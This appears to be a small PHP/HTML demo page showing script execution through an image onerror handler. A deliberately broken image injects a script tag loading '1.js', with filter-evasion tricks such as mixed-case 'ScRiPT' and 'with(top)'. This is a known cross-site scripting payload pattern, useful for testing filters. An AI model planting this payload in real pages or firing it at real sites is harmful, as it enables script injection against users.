<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: text/html');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Error Script Execution</title>
</head>
<body>
    <h1>Image Error Script Execution Example</h1>
    <!-- Intentionally broken image to trigger the onerror event -->
    <img src="brokenimage.jpg" onerror="with(top)body.appendChild(createElement(`ScRiPT`)).src='1.js';">
</body>
</html>
